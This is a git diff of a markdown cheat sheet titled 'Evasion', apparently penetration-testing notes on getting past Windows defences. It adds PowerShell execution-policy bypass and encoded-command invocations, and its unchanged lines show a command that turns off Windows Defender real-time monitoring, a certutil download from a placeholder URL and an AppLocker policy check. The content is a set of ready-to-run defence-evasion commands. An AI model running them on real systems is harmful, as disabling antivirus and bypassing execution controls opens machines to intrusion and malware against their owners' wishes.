@@ -1,5 +1,14 @@
 # Evasion
-## General
+## Execution-policy
+- Not meant to be a security measure
+```
+powershell –executionpolicy bypass .\script.ps1
+powershell –c <cmd>
+powershell –enc
+powershell.exe -executionpolicy bypass
+```
+
+## AV
 #### Disable AV monitoring
 ```
 Set-MpPreference -DisableRealtimeMonitoring $true
@@ -40,6 +49,7 @@ Start-Sleep -s 10
 certutil -urlcache -split -f <URL>
 ```
 
+## Applocker
 #### Check if applocker policy is running
 ```
 Get-AppLockerPolicy -Effective
